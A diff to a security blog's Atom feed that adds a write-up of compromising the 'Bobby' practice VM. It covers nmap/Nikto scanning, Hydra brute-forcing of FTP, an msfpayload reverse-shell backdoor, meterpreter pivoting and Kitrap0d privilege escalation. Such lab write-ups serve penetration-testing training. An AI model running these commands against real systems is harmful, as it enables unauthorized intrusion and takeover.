@@ -4,7 +4,7 @@
   <title><![CDATA[My portfolio]]></title>
   <link href="http://paulsec.github.io/atom.xml" rel="self"/>
   <link href="http://paulsec.github.io/"/>
-  <updated>2014-05-14T19:34:00+02:00</updated>
+  <updated>2014-05-15T22:18:36+02:00</updated>
   <id>http://paulsec.github.io/</id>
   <author>
     <name><![CDATA[Paul A. (PaulSec)]]></name>
@@ -12,6 +12,314 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Bobby: Write-up]]></title>
+    <link href="http://paulsec.github.io/blog/2014/05/15/bobby-write-up/"/>
+    <updated>2014-05-15T20:51:48+02:00</updated>
+    <id>http://paulsec.github.io/blog/2014/05/15/bobby-write-up</id>
+    <content type="html"><![CDATA[<p>Hi there,</p>
+
+<p>Quick blog post on the VM &ldquo;Bobby&rdquo; which is once of the nicest VM I did so far.</p>
+
+<h4>Discovery</h4>
+
+<p>The first step is always the same: discovering the machine on the network.
+To do so:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -sV 192.168.1.1/24</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I managed to retrieve the IP address: <code>192.168.1.11</code>.</p>
+
+<p>Let&rsquo;s start to fingerprint the different services to exploit it.</p>
+
+<h4>Fingerprinting</h4>
+
+<p>Then, I used Nmap to retrieve the services running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -sV 192.168.1.11
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-15 20:54 CEST
+</span><span class='line'>Nmap scan report for 192.168.1.11
+</span><span class='line'>Host is up (0.00037s latency).
+</span><span class='line'>Not shown: 997 filtered ports
+</span><span class='line'>PORT    STATE  SERVICE VERSION
+</span><span class='line'>21/tcp  open   ftp     Microsoft ftpd
+</span><span class='line'>80/tcp  open   http    Microsoft IIS httpd 5.1
+</span><span class='line'>443/tcp closed https
+</span><span class='line'>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using Nikto as well:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./nikto.pl -h http://192.168.1.11
+</span><span class='line'>- Nikto v2.1.5
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          192.168.1.11
+</span><span class='line'>+ Target Hostname:    192.168.1.11
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2014-05-15 20:56:29 (GMT2)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Microsoft-IIS/5.1
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x20b456b8599ce1:a02 
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
+</span><span class='line'>+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, PUT, DELETE 
+</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+</span><span class='line'>+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+</span><span class='line'>+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+</span><span class='line'>+ OSVDB-3092: /localstart.asp: This may be interesting...
+</span><span class='line'>+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2014-05-15 20:56:50 (GMT2) (21 seconds)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The page <code>localstart.asp</code> was asking some credentials but unfortunately I didn&rsquo;t have them.</p>
+
+<p>I also used DirBuster but I couldn&rsquo;t find relevant files/directories.</p>
+
+<p>I decided to target the FTP Server.
+I checked if there was an anonymous access on the FTP but there was none. Unfortunately.</p>
+
+<p>Based on the Web Application I decided to create some custom Wordlist because I didn&rsquo;t have any clue on what kind of password it could have been .</p>
+
+<p>I used the awesome tool <a href="http://www.remote-exploit.org/articles/misc_research__amp_code/index.html"><strong>Wyd</strong></a> that extracts single words/strings in some files.</p>
+
+<p>To do so:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://192.168.1.11 -O bobby.html</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And then :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./wyd.pl -o bobby.txt bobby.html</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The output is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>TheXero-01
+</span><span class='line'>Bobby's
+</span><span class='line'>blog
+</span><span class='line'>Welcome
+</span><span class='line'>to
+</span><span class='line'>my
+</span><span class='line'>personal
+</span><span class='line'>blogging
+</span><span class='line'>website
+</span><span class='line'>but
+</span><span class='line'>here
+</span><span class='line'>are
+</span><span class='line'>a
+</span><span class='line'>few
+</span><span class='line'>things
+</span><span class='line'>about
+</span><span class='line'>me
+</span><span class='line'>Favourite
+</span><span class='line'>film
+</span><span class='line'>Matrix
+</span><span class='line'>reloaded
+</span><span class='line'>music
+</span><span class='line'>artist
+</span><span class='line'>Daft
+</span><span class='line'>Punk
+</span><span class='line'>os
+</span><span class='line'>Windows
+</span><span class='line'>31
+</span><span class='line'>bobby</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Moreover, I didn&rsquo;t have any clue on the Username but thanks to the information we retrieved, I thought the username was something like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Bobby
+</span><span class='line'>BOBBY
+</span><span class='line'>BOB
+</span><span class='line'>BoB
+</span><span class='line'>Bob
+</span><span class='line'>bob
+</span><span class='line'>BOb
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After cracking it using Hydra, I was able to log in using those credentials: Bob/Matrix. Yay!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; o
+</span><span class='line'>(to) 192.168.1.11
+</span><span class='line'>Connected to 192.168.1.11.
+</span><span class='line'>220 Microsoft FTP Service
+</span><span class='line'>Name (192.168.1.11:paul): Bob
+</span><span class='line'>331 Password required for Bob.
+</span><span class='line'>Password:
+</span><span class='line'>230 User Bob logged in.
+</span><span class='line'>Remote system type is Windows_NT.
+</span><span class='line'>ftp&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks to this access, I found a file called: <code>hint.html</code>:</p>
+
+<p>*#1 This very common Windows file is not downloaded or interpretered but rather executed server side *</p>
+
+<h4>Exploitation</h4>
+
+<p>The scenario I have now is to create a reverse meterpreter backdoor, upload it, and execute it by getting to the page</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.11/backdoor.exe </span></code></pre></td></tr></table></div></figure>
+
+
+<p>I created the payload using <em>msfpayload</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.68 LPORT=4444 X &gt; /tmp/backdoor.exe</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, I uploaded the backdoor, had a listener on port 4444 and got a meterpreter session. Good!</p>
+
+<p>However, the meterpreter session stopped few mins later because of some timeout with the Web application&#8221;.
+I decided to :</p>
+
+<ul>
+<li>Re-execute the backdoor by accessing the file through the Web server</li>
+<li>Then, after getting the meterpreter session, execute it again: <code>execute -f backdoor.exe</code></li>
+<li>Go in backgroud, and restart a handler.</li>
+</ul>
+
+
+<p>You need to do it fast enough to catch the connection. Otherwise, you&rsquo;ll wait, and wait..</p>
+
+<p>Then, I got this second meterpreter session and I was sure this would not terminate because of some timeout.
+It was time to get SYSTEM privileges!</p>
+
+<h4>Getting SYSTEM</h4>
+
+<p>The first attempt was to use <code>getsystem</code> but unfortunately, I didn&rsquo;t have enough privileges.
+I couldn&rsquo;t migrate to another process.</p>
+
+<p>So, I decided to have a lot at all the processes, and services running on localhost which were not accessible from the outside.
+That&rsquo;s where I found the Terminal Server.</p>
+
+<p>I decided to add some route:</p>
+
+<p><code>route add 127.0.0.1 255.255.255.0 2</code></p>
+
+<p>I added a route that allowed me target the remote machine with the IP 127.0.0.1.
+The traffic was tunneled through the meterpreter&rsquo;s session. Nice trick, like it.</p>
+
+<p>Then, I portforwarded the Terminal Server port: 3389.</p>
+
+<p>I did it like this: <code>portfwd add -l 3389 -p 3389 -r 127.0.0.1</code></p>
+
+<p>That allowed me to target the local port 3389 and will forward the whole traffic to the remote port 3389.
+Another nice trick I like with Meterpreter.</p>
+
+<p>Thanks to this, I was able to use <strong>rdesktop</strong> and log in with <strong>Bob</strong> account (using password: Matrix).
+Then, I executed again the backdoor to get a proper user running the process.</p>
+
+<p>I managed to retrieve another meterpreter&rsquo;s session. I tried to use <code>getsystem</code> command again but no luck.
+However, I remember about an exploit called <a href="http://www.exploit-db.com/exploits/11199/"><strong>Kitrap0d</strong></a>.</p>
+
+<p>I checked if it was still in Metasploit (I remember it was another method in getsystem) and I was able to use it.
+Linked it to my Meterpreter&rsquo;s session and &ldquo;Voilà!&rdquo;, I got SYSTEM privileges. :&ndash;)</p>
+
+<p>The metasploit module is: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_015_kitrap0d.rb"><em>exploit/windows/local/ms10_015_kitrap0d</em></a>.</p>
+
+<p>I hope you liked the write-up which contains (in my opinion) funny tricks by adding some route, doing port forwarding, etc.
+Cheers and see you soon!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[HTTP Security Headers on top 10k Alexa websites]]></title>
